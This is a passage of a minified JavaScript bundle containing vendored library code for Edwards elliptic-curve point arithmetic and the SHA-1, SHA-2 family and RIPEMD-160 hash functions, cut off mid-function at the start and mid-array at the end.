            Q = ue.redMul(ae.redSub(V)),
            ee = ue.redMul(oe))
        } else
            ae = F.redAdd(V),
            ne = this.curve._mulC(this.z).redSqr(),
            oe = ae.redSub(ne).redSub(ne),
            K = this.curve._mulC(Y.redISub(ae)).redMul(oe),
            Q = this.curve._mulC(ae).redMul(F.redISub(V)),
            ee = ae.redMul(oe);
        return this.curve.point(K, Q, ee)
    }
    ,
    b.prototype.dbl = function() {
        return this.isInfinity() ? this : this.curve.extended ? this._extDbl() : this._projDbl()
    }
    ,
    b.prototype._extAdd = function(Y) {
        var F = this.y.redSub(this.x).redMul(Y.y.redSub(Y.x))
          , V = this.y.redAdd(this.x).redMul(Y.y.redAdd(Y.x))
          , K = this.t.redMul(this.curve.dd).redMul(Y.t)
          , Q = this.z.redMul(Y.z.redAdd(Y.z))
          , ee = V.redSub(F)
          , ae = Q.redSub(K)
          , ne = Q.redAdd(K)
          , oe = V.redAdd(F)
          , ue = ee.redMul(ae)
          , fe = ne.redMul(oe)
          , he = ee.redMul(oe)
          , pe = ae.redMul(ne);
        return this.curve.point(ue, fe, pe, he)
    }
    ,
    b.prototype._projAdd = function(Y) {
        var F = this.z.redMul(Y.z), V = F.redSqr(), K = this.x.redMul(Y.x), Q = this.y.redMul(Y.y), ee = this.curve.d.redMul(K).redMul(Q), ae = V.redSub(ee), ne = V.redAdd(ee), oe = this.x.redAdd(this.y).redMul(Y.x.redAdd(Y.y)).redISub(K).redISub(Q), ue = F.redMul(ae).redMul(oe), fe, he;
        return this.curve.twisted ? (fe = F.redMul(ne).redMul(Q.redSub(this.curve._mulA(K))),
        he = ae.redMul(ne)) : (fe = F.redMul(ne).redMul(Q.redSub(K)),
        he = this.curve._mulC(ae).redMul(ne)),
        this.curve.point(ue, fe, he)
    }
    ,
    b.prototype.add = function(Y) {
        return this.isInfinity() ? Y : Y.isInfinity() ? this : this.curve.extended ? this._extAdd(Y) : this._projAdd(Y)
    }
    ,
    b.prototype.mul = function(Y) {
        return this._hasDoubles(Y) ? this.curve._fixedNafMul(this, Y) : this.curve._wnafMul(this, Y)
    }
    ,
    b.prototype.mulAdd = function(Y, F, V) {
        return this.curve._wnafMulAdd(1, [this, F], [Y, V], 2, !1)
    }
    ,
    b.prototype.jmulAdd = function(Y, F, V) {
        return this.curve._wnafMulAdd(1, [this, F], [Y, V], 2, !0)
    }
    ,
    b.prototype.normalize = function() {
        if (this.zOne)
            return this;
        var Y = this.z.redInvm();
        return this.x = this.x.redMul(Y),
        this.y = this.y.redMul(Y),
        this.t && (this.t = this.t.redMul(Y)),
        this.z = this.curve.one,
        this.zOne = !0,
        this
    }
    ,
    b.prototype.neg = function() {
        return this.curve.point(this.x.redNeg(), this.y, this.z, this.t && this.t.redNeg())
    }
    ,
    b.prototype.getX = function() {
        return this.normalize(),
        this.x.fromRed()
    }
    ,
    b.prototype.getY = function() {
        return this.normalize(),
        this.y.fromRed()
    }
    ,
    b.prototype.eq = function(Y) {
        return this === Y || this.getX().cmp(Y.getX()) === 0 && this.getY().cmp(Y.getY()) === 0
    }
    ,
    b.prototype.eqXToP = function(Y) {
        var F = Y.toRed(this.curve.red).redMul(this.z);
        if (this.x.cmp(F) === 0)
            return !0;
        for (var V = Y.clone(), K = this.curve.redN.redMul(this.z); ; ) {
            if (V.iadd(this.curve.n),
            V.cmp(this.curve.p) >= 0)
                return !1;
            if (F.redIAdd(K),
            this.x.cmp(F) === 0)
                return !0
        }
    }
    ,
    b.prototype.toP = b.prototype.normalize,
    b.prototype.mixedAdd = b.prototype.add,
    edwards
}
var hasRequiredCurve;
function requireCurve() {
    return hasRequiredCurve || (hasRequiredCurve = 1,
    function(_) {
        var M = _;
        M.base = requireBase$1(),
        M.short = requireShort(),
        M.mont = requireMont(),
        M.edwards = requireEdwards()
    }(curve)),
    curve
}
var curves = {}, hash = {}, utils$6 = {}, hasRequiredUtils$4;
function requireUtils$4() {
    if (hasRequiredUtils$4)
        return utils$6;
    hasRequiredUtils$4 = 1;
    var _ = requireMinimalisticAssert()
      , M = requireInherits_browser();
    utils$6.inherits = M;
    function j(q, L) {
        return (q.charCodeAt(L) & 64512) !== 55296 || L < 0 || L + 1 >= q.length ? !1 : (q.charCodeAt(L + 1) & 64512) === 56320
    }
    function O(q, L) {
        if (Array.isArray(q))
            return q.slice();
        if (!q)
            return [];
        var U = [];
        if (typeof q == "string")
            if (L) {
                if (L === "hex")
                    for (q = q.replace(/[^a-z0-9]+/ig, ""),
                    q.length % 2 !== 0 && (q = "0" + q),
                    te = 0; te < q.length; te += 2)
                        U.push(parseInt(q[te] + q[te + 1], 16))
            } else
                for (var Z = 0, te = 0; te < q.length; te++) {
                    var se = q.charCodeAt(te);
                    se < 128 ? U[Z++] = se : se < 2048 ? (U[Z++] = se >> 6 | 192,
                    U[Z++] = se & 63 | 128) : j(q, te) ? (se = 65536 + ((se & 1023) << 10) + (q.charCodeAt(++te) & 1023),
                    U[Z++] = se >> 18 | 240,
                    U[Z++] = se >> 12 & 63 | 128,
                    U[Z++] = se >> 6 & 63 | 128,
                    U[Z++] = se & 63 | 128) : (U[Z++] = se >> 12 | 224,
                    U[Z++] = se >> 6 & 63 | 128,
                    U[Z++] = se & 63 | 128)
                }
        else
            for (te = 0; te < q.length; te++)
                U[te] = q[te] | 0;
        return U
    }
    utils$6.toArray = O;
    function x(q) {
        for (var L = "", U = 0; U < q.length; U++)
            L += X(q[U].toString(16));
        return L
    }
    utils$6.toHex = x;
    function w(q) {
        var L = q >>> 24 | q >>> 8 & 65280 | q << 8 & 16711680 | (q & 255) << 24;
        return L >>> 0
    }
    utils$6.htonl = w;
    function b(q, L) {
        for (var U = "", Z = 0; Z < q.length; Z++) {
            var te = q[Z];
            L === "little" && (te = w(te)),
            U += Y(te.toString(16))
        }
        return U
    }
    utils$6.toHex32 = b;
    function X(q) {
        return q.length === 1 ? "0" + q : q
    }
    utils$6.zero2 = X;
    function Y(q) {
        return q.length === 7 ? "0" + q : q.length === 6 ? "00" + q : q.length === 5 ? "000" + q : q.length === 4 ? "0000" + q : q.length === 3 ? "00000" + q : q.length === 2 ? "000000" + q : q.length === 1 ? "0000000" + q : q
    }
    utils$6.zero8 = Y;
    function F(q, L, U, Z) {
        var te = U - L;
        _(te % 4 === 0);
        for (var se = new Array(te / 4), de = 0, re = L; de < se.length; de++,
        re += 4) {
            var $;
            Z === "big" ? $ = q[re] << 24 | q[re + 1] << 16 | q[re + 2] << 8 | q[re + 3] : $ = q[re + 3] << 24 | q[re + 2] << 16 | q[re + 1] << 8 | q[re],
            se[de] = $ >>> 0
        }
        return se
    }
    utils$6.join32 = F;
    function V(q, L) {
        for (var U = new Array(q.length * 4), Z = 0, te = 0; Z < q.length; Z++,
        te += 4) {
            var se = q[Z];
            L === "big" ? (U[te] = se >>> 24,
            U[te + 1] = se >>> 16 & 255,
            U[te + 2] = se >>> 8 & 255,
            U[te + 3] = se & 255) : (U[te + 3] = se >>> 24,
            U[te + 2] = se >>> 16 & 255,
            U[te + 1] = se >>> 8 & 255,
            U[te] = se & 255)
        }
        return U
    }
    utils$6.split32 = V;
    function K(q, L) {
        return q >>> L | q << 32 - L
    }
    utils$6.rotr32 = K;
    function Q(q, L) {
        return q << L | q >>> 32 - L
    }
    utils$6.rotl32 = Q;
    function ee(q, L) {
        return q + L >>> 0
    }
    utils$6.sum32 = ee;
    function ae(q, L, U) {
        return q + L + U >>> 0
    }
    utils$6.sum32_3 = ae;
    function ne(q, L, U, Z) {
        return q + L + U + Z >>> 0
    }
    utils$6.sum32_4 = ne;
    function oe(q, L, U, Z, te) {
        return q + L + U + Z + te >>> 0
    }
    utils$6.sum32_5 = oe;
    function ue(q, L, U, Z) {
        var te = q[L]
          , se = q[L + 1]
          , de = Z + se >>> 0
          , re = (de < Z ? 1 : 0) + U + te;
        q[L] = re >>> 0,
        q[L + 1] = de
    }
    utils$6.sum64 = ue;
    function fe(q, L, U, Z) {
        var te = L + Z >>> 0
          , se = (te < L ? 1 : 0) + q + U;
        return se >>> 0
    }
    utils$6.sum64_hi = fe;
    function he(q, L, U, Z) {
        var te = L + Z;
        return te >>> 0
    }
    utils$6.sum64_lo = he;
    function pe(q, L, U, Z, te, se, de, re) {
        var $ = 0
          , ie = L;
        ie = ie + Z >>> 0,
        $ += ie < L ? 1 : 0,
        ie = ie + se >>> 0,
        $ += ie < se ? 1 : 0,
        ie = ie + re >>> 0,
        $ += ie < re ? 1 : 0;
        var ve = q + U + te + de + $;
        return ve >>> 0
    }
    utils$6.sum64_4_hi = pe;
    function ye(q, L, U, Z, te, se, de, re) {
        var $ = L + Z + se + re;
        return $ >>> 0
    }
    utils$6.sum64_4_lo = ye;
    function be(q, L, U, Z, te, se, de, re, $, ie) {
        var ve = 0
          , ge = L;
        ge = ge + Z >>> 0,
        ve += ge < L ? 1 : 0,
        ge = ge + se >>> 0,
        ve += ge < se ? 1 : 0,
        ge = ge + re >>> 0,
        ve += ge < re ? 1 : 0,
        ge = ge + ie >>> 0,
        ve += ge < ie ? 1 : 0;
        var Re = q + U + te + de + $ + ve;
        return Re >>> 0
    }
    utils$6.sum64_5_hi = be;
    function xe(q, L, U, Z, te, se, de, re, $, ie) {
        var ve = L + Z + se + re + ie;
        return ve >>> 0
    }
    utils$6.sum64_5_lo = xe;
    function Ae(q, L, U) {
        var Z = L << 32 - U | q >>> U;
        return Z >>> 0
    }
    utils$6.rotr64_hi = Ae;
    function Ee(q, L, U) {
        var Z = q << 32 - U | L >>> U;
        return Z >>> 0
    }
    utils$6.rotr64_lo = Ee;
    function Be(q, L, U) {
        return q >>> U
    }
    utils$6.shr64_hi = Be;
    function ce(q, L, U) {
        var Z = q << 32 - U | L >>> U;
        return Z >>> 0
    }
    return utils$6.shr64_lo = ce,
    utils$6
}
var common$2 = {}, hasRequiredCommon$2;
function requireCommon$2() {
    if (hasRequiredCommon$2)
        return common$2;
    hasRequiredCommon$2 = 1;
    var _ = requireUtils$4()
      , M = requireMinimalisticAssert();
    function j() {
        this.pending = null,
        this.pendingTotal = 0,
        this.blockSize = this.constructor.blockSize,
        this.outSize = this.constructor.outSize,
        this.hmacStrength = this.constructor.hmacStrength,
        this.padLength = this.constructor.padLength / 8,
        this.endian = "big",
        this._delta8 = this.blockSize / 8,
        this._delta32 = this.blockSize / 32
    }
    return common$2.BlockHash = j,
    j.prototype.update = function(x, w) {
        if (x = _.toArray(x, w),
        this.pending ? this.pending = this.pending.concat(x) : this.pending = x,
        this.pendingTotal += x.length,
        this.pending.length >= this._delta8) {
            x = this.pending;
            var b = x.length % this._delta8;
            this.pending = x.slice(x.length - b, x.length),
            this.pending.length === 0 && (this.pending = null),
            x = _.join32(x, 0, x.length - b, this.endian);
            for (var X = 0; X < x.length; X += this._delta32)
                this._update(x, X, X + this._delta32)
        }
        return this
    }
    ,
    j.prototype.digest = function(x) {
        return this.update(this._pad()),
        M(this.pending === null),
        this._digest(x)
    }
    ,
    j.prototype._pad = function() {
        var x = this.pendingTotal
          , w = this._delta8
          , b = w - (x + this.padLength) % w
          , X = new Array(b + this.padLength);
        X[0] = 128;
        for (var Y = 1; Y < b; Y++)
            X[Y] = 0;
        if (x <<= 3,
        this.endian === "big") {
            for (var F = 8; F < this.padLength; F++)
                X[Y++] = 0;
            X[Y++] = 0,
            X[Y++] = 0,
            X[Y++] = 0,
            X[Y++] = 0,
            X[Y++] = x >>> 24 & 255,
            X[Y++] = x >>> 16 & 255,
            X[Y++] = x >>> 8 & 255,
            X[Y++] = x & 255
        } else
            for (X[Y++] = x & 255,
            X[Y++] = x >>> 8 & 255,
            X[Y++] = x >>> 16 & 255,
            X[Y++] = x >>> 24 & 255,
            X[Y++] = 0,
            X[Y++] = 0,
            X[Y++] = 0,
            X[Y++] = 0,
            F = 8; F < this.padLength; F++)
                X[Y++] = 0;
        return X
    }
    ,
    common$2
}
var sha = {}, common$1 = {}, hasRequiredCommon$1;
function requireCommon$1() {
    if (hasRequiredCommon$1)
        return common$1;
    hasRequiredCommon$1 = 1;
    var _ = requireUtils$4()
      , M = _.rotr32;
    function j(V, K, Q, ee) {
        if (V === 0)
            return O(K, Q, ee);
        if (V === 1 || V === 3)
            return w(K, Q, ee);
        if (V === 2)
            return x(K, Q, ee)
    }
    common$1.ft_1 = j;
    function O(V, K, Q) {
        return V & K ^ ~V & Q
    }
    common$1.ch32 = O;
    function x(V, K, Q) {
        return V & K ^ V & Q ^ K & Q
    }
    common$1.maj32 = x;
    function w(V, K, Q) {
        return V ^ K ^ Q
    }
    common$1.p32 = w;
    function b(V) {
        return M(V, 2) ^ M(V, 13) ^ M(V, 22)
    }
    common$1.s0_256 = b;
    function X(V) {
        return M(V, 6) ^ M(V, 11) ^ M(V, 25)
    }
    common$1.s1_256 = X;
    function Y(V) {
        return M(V, 7) ^ M(V, 18) ^ V >>> 3
    }
    common$1.g0_256 = Y;
    function F(V) {
        return M(V, 17) ^ M(V, 19) ^ V >>> 10
    }
    return common$1.g1_256 = F,
    common$1
}
var _1, hasRequired_1;
function require_1() {
    if (hasRequired_1)
        return _1;
    hasRequired_1 = 1;
    var _ = requireUtils$4()
      , M = requireCommon$2()
      , j = requireCommon$1()
      , O = _.rotl32
      , x = _.sum32
      , w = _.sum32_5
      , b = j.ft_1
      , X = M.BlockHash
      , Y = [1518500249, 1859775393, 2400959708, 3395469782];
    function F() {
        if (!(this instanceof F))
            return new F;
        X.call(this),
        this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520],
        this.W = new Array(80)
    }
    return _.inherits(F, X),
    _1 = F,
    F.blockSize = 512,
    F.outSize = 160,
    F.hmacStrength = 80,
    F.padLength = 64,
    F.prototype._update = function(K, Q) {
        for (var ee = this.W, ae = 0; ae < 16; ae++)
            ee[ae] = K[Q + ae];
        for (; ae < ee.length; ae++)
            ee[ae] = O(ee[ae - 3] ^ ee[ae - 8] ^ ee[ae - 14] ^ ee[ae - 16], 1);
        var ne = this.h[0]
          , oe = this.h[1]
          , ue = this.h[2]
          , fe = this.h[3]
          , he = this.h[4];
        for (ae = 0; ae < ee.length; ae++) {
            var pe = ~~(ae / 20)
              , ye = w(O(ne, 5), b(pe, oe, ue, fe), he, ee[ae], Y[pe]);
            he = fe,
            fe = ue,
            ue = O(oe, 30),
            oe = ne,
            ne = ye
        }
        this.h[0] = x(this.h[0], ne),
        this.h[1] = x(this.h[1], oe),
        this.h[2] = x(this.h[2], ue),
        this.h[3] = x(this.h[3], fe),
        this.h[4] = x(this.h[4], he)
    }
    ,
    F.prototype._digest = function(K) {
        return K === "hex" ? _.toHex32(this.h, "big") : _.split32(this.h, "big")
    }
    ,
    _1
}
var _256, hasRequired_256;
function require_256() {
    if (hasRequired_256)
        return _256;
    hasRequired_256 = 1;
    var _ = requireUtils$4()
      , M = requireCommon$2()
      , j = requireCommon$1()
      , O = requireMinimalisticAssert()
      , x = _.sum32
      , w = _.sum32_4
      , b = _.sum32_5
      , X = j.ch32
      , Y = j.maj32
      , F = j.s0_256
      , V = j.s1_256
      , K = j.g0_256
      , Q = j.g1_256
      , ee = M.BlockHash
      , ae = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298];
    function ne() {
        if (!(this instanceof ne))
            return new ne;
        ee.call(this),
        this.h = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225],
        this.k = ae,
        this.W = new Array(64)
    }
    return _.inherits(ne, ee),
    _256 = ne,
    ne.blockSize = 512,
    ne.outSize = 256,
    ne.hmacStrength = 192,
    ne.padLength = 64,
    ne.prototype._update = function(ue, fe) {
        for (var he = this.W, pe = 0; pe < 16; pe++)
            he[pe] = ue[fe + pe];
        for (; pe < he.length; pe++)
            he[pe] = w(Q(he[pe - 2]), he[pe - 7], K(he[pe - 15]), he[pe - 16]);
        var ye = this.h[0]
          , be = this.h[1]
          , xe = this.h[2]
          , Ae = this.h[3]
          , Ee = this.h[4]
          , Be = this.h[5]
          , ce = this.h[6]
          , q = this.h[7];
        for (O(this.k.length === he.length),
        pe = 0; pe < he.length; pe++) {
            var L = b(q, V(Ee), X(Ee, Be, ce), this.k[pe], he[pe])
              , U = x(F(ye), Y(ye, be, xe));
            q = ce,
            ce = Be,
            Be = Ee,
            Ee = x(Ae, L),
            Ae = xe,
            xe = be,
            be = ye,
            ye = x(L, U)
        }
        this.h[0] = x(this.h[0], ye),
        this.h[1] = x(this.h[1], be),
        this.h[2] = x(this.h[2], xe),
        this.h[3] = x(this.h[3], Ae),
        this.h[4] = x(this.h[4], Ee),
        this.h[5] = x(this.h[5], Be),
        this.h[6] = x(this.h[6], ce),
        this.h[7] = x(this.h[7], q)
    }
    ,
    ne.prototype._digest = function(ue) {
        return ue === "hex" ? _.toHex32(this.h, "big") : _.split32(this.h, "big")
    }
    ,
    _256
}
var _224, hasRequired_224;
function require_224() {
    if (hasRequired_224)
        return _224;
    hasRequired_224 = 1;
    var _ = requireUtils$4()
      , M = require_256();
    function j() {
        if (!(this instanceof j))
            return new j;
        M.call(this),
        this.h = [3238371032, 914150663, 812702999, 4144912697, 4290775857, 1750603025, 1694076839, 3204075428]
    }
    return _.inherits(j, M),
    _224 = j,
    j.blockSize = 512,
    j.outSize = 224,
    j.hmacStrength = 192,
    j.padLength = 64,
    j.prototype._digest = function(x) {
        return x === "hex" ? _.toHex32(this.h.slice(0, 7), "big") : _.split32(this.h.slice(0, 7), "big")
    }
    ,
    _224
}
var _512, hasRequired_512;
function require_512() {
    if (hasRequired_512)
        return _512;
    hasRequired_512 = 1;
    var _ = requireUtils$4()
      , M = requireCommon$2()
      , j = requireMinimalisticAssert()
      , O = _.rotr64_hi
      , x = _.rotr64_lo
      , w = _.shr64_hi
      , b = _.shr64_lo
      , X = _.sum64
      , Y = _.sum64_hi
      , F = _.sum64_lo
      , V = _.sum64_4_hi
      , K = _.sum64_4_lo
      , Q = _.sum64_5_hi
      , ee = _.sum64_5_lo
      , ae = M.BlockHash
      , ne = [1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399, 3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265, 2453635748, 2937671579, 2870763221, 3664609560, 3624381080, 2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987, 3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103, 633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774, 944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983, 1495990901, 1249150122, 1856431235, 1555081692, 3175218132, 1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016, 2952996808, 2566594879, 3210313671, 3203337956, 3336571891, 1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895, 168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372, 1522805485, 1396182291, 2643833823, 1695183700, 2343527390, 1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627, 2730485921, 1290863460, 2820302411, 3158454273, 3259730800, 3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804, 1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734, 3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877, 3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063, 2003034995, 1747873779, 3602036899, 1955562222, 1575990012, 2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044, 2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573, 3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711, 3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554, 174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315, 685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100, 1126000580, 2618297676, 1288033470, 3409855158, 1501505948, 4234509866, 1607167915, 987167468, 1816402316, 1246189591];
    function oe() {
        if (!(this instanceof oe))
            return new oe;
        ae.call(this),
        this.h = [1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723, 2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199, 528734635, 4215389547, 1541459225, 327033209],
        this.k = ne,
        this.W = new Array(160)
    }
    _.inherits(oe, ae),
    _512 = oe,
    oe.blockSize = 1024,
    oe.outSize = 512,
    oe.hmacStrength = 192,
    oe.padLength = 128,
    oe.prototype._prepareBlock = function(U, Z) {
        for (var te = this.W, se = 0; se < 32; se++)
            te[se] = U[Z + se];
        for (; se < te.length; se += 2) {
            var de = ce(te[se - 4], te[se - 3])
              , re = q(te[se - 4], te[se - 3])
              , $ = te[se - 14]
              , ie = te[se - 13]
              , ve = Ee(te[se - 30], te[se - 29])
              , ge = Be(te[se - 30], te[se - 29])
              , Re = te[se - 32]
              , Pe = te[se - 31];
            te[se] = V(de, re, $, ie, ve, ge, Re, Pe),
            te[se + 1] = K(de, re, $, ie, ve, ge, Re, Pe)
        }
    }
    ,
    oe.prototype._update = function(U, Z) {
        this._prepareBlock(U, Z);
        var te = this.W
          , se = this.h[0]
          , de = this.h[1]
          , re = this.h[2]
          , $ = this.h[3]
          , ie = this.h[4]
          , ve = this.h[5]
          , ge = this.h[6]
          , Re = this.h[7]
          , Pe = this.h[8]
          , Ie = this.h[9]
          , Te = this.h[10]
          , Le = this.h[11]
          , Ze = this.h[12]
          , $e = this.h[13]
          , Ne = this.h[14]
          , qe = this.h[15];
        j(this.k.length === te.length);
        for (var Ve = 0; Ve < te.length; Ve += 2) {
            var lt = Ne
              , nt = qe
              , je = xe(Pe, Ie)
              , Ke = Ae(Pe, Ie)
              , Qe = ue(Pe, Ie, Te, Le, Ze)
              , We = fe(Pe, Ie, Te, Le, Ze, $e)
              , mt = this.k[Ve]
              , ct = this.k[Ve + 1]
              , vt = te[Ve]
              , we = te[Ve + 1]
              , _e = Q(lt, nt, je, Ke, Qe, We, mt, ct, vt, we)
              , Ce = ee(lt, nt, je, Ke, Qe, We, mt, ct, vt, we);
            lt = ye(se, de),
            nt = be(se, de),
            je = he(se, de, re, $, ie),
            Ke = pe(se, de, re, $, ie, ve);
            var st = Y(lt, nt, je, Ke)
              , et = F(lt, nt, je, Ke);
            Ne = Ze,
            qe = $e,
            Ze = Te,
            $e = Le,
            Te = Pe,
            Le = Ie,
            Pe = Y(ge, Re, _e, Ce),
            Ie = F(Re, Re, _e, Ce),
            ge = ie,
            Re = ve,
            ie = re,
            ve = $,
            re = se,
            $ = de,
            se = Y(_e, Ce, st, et),
            de = F(_e, Ce, st, et)
        }
        X(this.h, 0, se, de),
        X(this.h, 2, re, $),
        X(this.h, 4, ie, ve),
        X(this.h, 6, ge, Re),
        X(this.h, 8, Pe, Ie),
        X(this.h, 10, Te, Le),
        X(this.h, 12, Ze, $e),
        X(this.h, 14, Ne, qe)
    }
    ,
    oe.prototype._digest = function(U) {
        return U === "hex" ? _.toHex32(this.h, "big") : _.split32(this.h, "big")
    }
    ;
    function ue(L, U, Z, te, se) {
        var de = L & Z ^ ~L & se;
        return de < 0 && (de += 4294967296),
        de
    }
    function fe(L, U, Z, te, se, de) {
        var re = U & te ^ ~U & de;
        return re < 0 && (re += 4294967296),
        re
    }
    function he(L, U, Z, te, se) {
        var de = L & Z ^ L & se ^ Z & se;
        return de < 0 && (de += 4294967296),
        de
    }
    function pe(L, U, Z, te, se, de) {
        var re = U & te ^ U & de ^ te & de;
        return re < 0 && (re += 4294967296),
        re
    }
    function ye(L, U) {
        var Z = O(L, U, 28)
          , te = O(U, L, 2)
          , se = O(U, L, 7)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function be(L, U) {
        var Z = x(L, U, 28)
          , te = x(U, L, 2)
          , se = x(U, L, 7)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function xe(L, U) {
        var Z = O(L, U, 14)
          , te = O(L, U, 18)
          , se = O(U, L, 9)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function Ae(L, U) {
        var Z = x(L, U, 14)
          , te = x(L, U, 18)
          , se = x(U, L, 9)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function Ee(L, U) {
        var Z = O(L, U, 1)
          , te = O(L, U, 8)
          , se = w(L, U, 7)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function Be(L, U) {
        var Z = x(L, U, 1)
          , te = x(L, U, 8)
          , se = b(L, U, 7)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function ce(L, U) {
        var Z = O(L, U, 19)
          , te = O(U, L, 29)
          , se = w(L, U, 6)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    function q(L, U) {
        var Z = x(L, U, 19)
          , te = x(U, L, 29)
          , se = b(L, U, 6)
          , de = Z ^ te ^ se;
        return de < 0 && (de += 4294967296),
        de
    }
    return _512
}
var _384, hasRequired_384;
function require_384() {
    if (hasRequired_384)
        return _384;
    hasRequired_384 = 1;
    var _ = requireUtils$4()
      , M = require_512();
    function j() {
        if (!(this instanceof j))
            return new j;
        M.call(this),
        this.h = [3418070365, 3238371032, 1654270250, 914150663, 2438529370, 812702999, 355462360, 4144912697, 1731405415, 4290775857, 2394180231, 1750603025, 3675008525, 1694076839, 1203062813, 3204075428]
    }
    return _.inherits(j, M),
    _384 = j,
    j.blockSize = 1024,
    j.outSize = 384,
    j.hmacStrength = 192,
    j.padLength = 128,
    j.prototype._digest = function(x) {
        return x === "hex" ? _.toHex32(this.h.slice(0, 12), "big") : _.split32(this.h.slice(0, 12), "big")
    }
    ,
    _384
}
var hasRequiredSha;
function requireSha() {
    return hasRequiredSha || (hasRequiredSha = 1,
    sha.sha1 = require_1(),
    sha.sha224 = require_224(),
    sha.sha256 = require_256(),
    sha.sha384 = require_384(),
    sha.sha512 = require_512()),
    sha
}
var ripemd = {}, hasRequiredRipemd;
function requireRipemd() {
    if (hasRequiredRipemd)
        return ripemd;
    hasRequiredRipemd = 1;
    var _ = requireUtils$4()
      , M = requireCommon$2()
      , j = _.rotl32
      , O = _.sum32
      , x = _.sum32_3
      , w = _.sum32_4
      , b = M.BlockHash;
    function X() {
        if (!(this instanceof X))
            return new X;
        b.call(this),
        this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520],
        this.endian = "little"
    }
    _.inherits(X, b),
    ripemd.ripemd160 = X,
    X.blockSize = 512,
    X.outSize = 160,
    X.hmacStrength = 192,
    X.padLength = 64,
    X.prototype._update = function(oe, ue) {
        for (var fe = this.h[0], he = this.h[1], pe = this.h[2], ye = this.h[3], be = this.h[4], xe = fe, Ae = he, Ee = pe, Be = ye, ce = be, q = 0; q < 80; q++) {
            var L = O(j(w(fe, Y(q, he, pe, ye), oe[K[q] + ue], F(q)), ee[q]), be);
            fe = be,
            be = ye,
            ye = j(pe, 10),
            pe = he,
            he = L,
            L = O(j(w(xe, Y(79 - q, Ae, Ee, Be), oe[Q[q] + ue], V(q)), ae[q]), ce),
            xe = ce,
            ce = Be,
            Be = j(Ee, 10),
            Ee = Ae,
            Ae = L
        }
        L = x(this.h[1], pe, Be),
        this.h[1] = x(this.h[2], ye, ce),
        this.h[2] = x(this.h[3], be, xe),
        this.h[3] = x(this.h[4], fe, Ae),
        this.h[4] = x(this.h[0], he, Ee),
        this.h[0] = L
    }
    ,
    X.prototype._digest = function(oe) {
        return oe === "hex" ? _.toHex32(this.h, "little") : _.split32(this.h, "little")
    }
    ;
    function Y(ne, oe, ue, fe) {
        return ne <= 15 ? oe ^ ue ^ fe : ne <= 31 ? oe & ue | ~oe & fe : ne <= 47 ? (oe | ~ue) ^ fe : ne <= 63 ? oe & fe | ue & ~fe : oe ^ (ue | ~fe)
    }
    function F(ne) {
        return ne <= 15 ? 0 : ne <= 31 ? 1518500249 : ne <= 47 ? 1859775393 : ne <= 63 ? 2400959708 : 2840853838
    }
    function V(ne) {
        return ne <= 15 ? 1352829926 : ne <= 31 ? 1548603684 : ne <= 47 ? 1836072691 : ne <= 63 ? 2053994217 : 0
    }
    var K = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13]
      , Q = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11]
